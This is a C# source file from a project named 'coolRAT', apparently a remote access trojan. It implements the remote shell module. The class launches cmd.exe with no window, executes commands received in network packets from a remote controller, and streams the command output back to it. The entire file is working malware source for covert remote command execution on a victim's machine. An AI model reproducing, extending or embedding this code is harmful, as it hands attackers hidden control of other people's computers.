using coolRAT.Libs.Connections;
using coolRAT.Libs.Packets;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace coolRAT.Libs
{

    public class Shell
    {
        public Guid UniqueId;
        public Process Process;
        public Client OwnerClient;

        public StringBuilder GlobalOutputBuffer;
        public StringBuilder GlobalInputBuffer;

        private DataReceivedEventHandler DataReceivedEventHandler;

        public static bool ResetClock;
        public static int Buffer_Timeout = 100;

        public Shell(Guid uniqueId, Client ownerClient)
        {
            UniqueId = uniqueId;
            OwnerClient = ownerClient ?? throw new ArgumentNullException(nameof(ownerClient));
            Initialize_Shell();
        }

        public Shell(Client ownerClient)
        {
            UniqueId = Guid.NewGuid();
            OwnerClient = ownerClient ?? throw new ArgumentNullException(nameof(ownerClient));
            Initialize_Shell();
        }

        public void Clock_Tick()
        {
            while (true)
            {
                Thread.Sleep(Buffer_Timeout);
                if (!ResetClock)
                {
                    if (GlobalOutputBuffer.Length == 0) continue;
                    // Send buffer contents to the remote shell
                    Shell_IO_ChangedPacket changedPacket = new Shell_IO_ChangedPacket(OwnerClient.UniqueId, ChangeType.Output, GlobalOutputBuffer.ToString());
                    OwnerClient.SendPacket(changedPacket);
                    GlobalOutputBuffer.Clear();
                }
                else
                    ResetClock = false;
            }
        }

        private protected void Initialize_Shell()
        {
            GlobalOutputBuffer = new StringBuilder();
            GlobalInputBuffer = new StringBuilder();
            Process = new Process();
            Process.StartInfo.FileName = "cmd.exe";
            Process.StartInfo.CreateNoWindow = true;
            Process.StartInfo.UseShellExecute = false;
            Process.StartInfo.RedirectStandardOutput = true;
            Process.StartInfo.RedirectStandardError = true;
            Process.StartInfo.RedirectStandardInput = true;
            DataReceivedEventHandler = new DataReceivedEventHandler(CmdOutputDataHandler);
            Process.OutputDataReceived += DataReceivedEventHandler;
            Process.ErrorDataReceived += DataReceivedEventHandler;

            // Register event handlers
            OwnerClient.RegisterPacketHandler("Shell_IO_ChangedPacket", Shell_PacketReceivedHandler);
            OwnerClient.RegisterPacketHandler("SetShellStatePacket", Shell_PacketReceivedHandler);
        }

        public void Shell_PacketReceivedHandler(object sender, PacketReceivedEventArgs e)
        {
            if(e.Packet.Type == "Shell_IO_ChangedPacket")
            {
                Shell_IO_ChangedPacket changedPacket = Shell_IO_ChangedPacket.Deserialize(e.RawPacket);
                if (changedPacket.ChangeType == ChangeType.Input)
                    Write(changedPacket.Change);
                return;
            }

            if(e.Packet.Type == "SetShellStatePacket")
            {
                SetShellStatePacket setShellState = SetShellStatePacket.Deserialize(e.RawPacket);
                if(setShellState.ShellUniqueId != UniqueId)
                {
                    ShellStateSetPacket result_fail = new ShellStateSetPacket(setShellState.UniqueClientId, setShellState.ShellUniqueId,
                    setShellState.ShellState, false);
                    OwnerClient.SendPacket(result_fail);
                    return;
                }

                switch(setShellState.ShellState)
                {
                    case ShellState.Running:
                        Start();
                        break;
                    case ShellState.Stopped:
                        Stop();
                        break;
                }

                ShellStateSetPacket result_success = new ShellStateSetPacket(setShellState.UniqueClientId, setShellState.ShellUniqueId,
                    setShellState.ShellState, true);
                OwnerClient.SendPacket(result_success);
                return;
            }
        }

        public void Start()
        {
            Process.Start();
            Task.Run(() => Clock_Tick());
            Process.BeginOutputReadLine();
            Process.BeginErrorReadLine();
            Process.StandardInput.Write("\n");
        }

        public void Stop()
        {
            if (Process == null) return;
            Process.Kill();
            Process.OutputDataReceived -= DataReceivedEventHandler;
            Process.ErrorDataReceived -= DataReceivedEventHandler;
            OwnerClient.DeregisterPacketHandler("Shell_IO_ChangedPacket");
            OwnerClient.DeregisterPacketHandler("SetShellStatePacket");
        }

        public void Write(string str)
        {
            Process_Input(str);
            ResetClock = true;
        }

        public void WriteLine(string str)
        {
            Process_Input(str);
            ResetClock = true;
        }

        public void Process_Input(string input)
        {
            char[] in_arr = input.ToCharArray();
            foreach (char chr in in_arr)
            {
                switch (chr)
                {
                    case '\n': // Flush the buffer and write to the input stream
                        GlobalInputBuffer.Append(chr);
                        GlobalOutputBuffer.Append(chr);
                        Process.StandardInput.Write(GlobalInputBuffer.ToString());
                        GlobalInputBuffer.Clear();
                        Process.StandardInput.Write("\n");
                        break;
                    case '\b':
                        if (GlobalInputBuffer.Length == 0) continue;
                        GlobalInputBuffer.Remove(GlobalInputBuffer.Length - 1, 1);
                        GlobalOutputBuffer.Append(chr);
                        break;
                    default: // Add the character to the buffer
                        GlobalInputBuffer.Append(chr);
                        GlobalOutputBuffer.Append(chr);
                        break;
                }
            }

        }

        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                GlobalOutputBuffer.AppendLine(outLine.Data);
                strOutput.AppendLine(outLine.Data);
                ResetClock = true;
            }
        }
    }
}
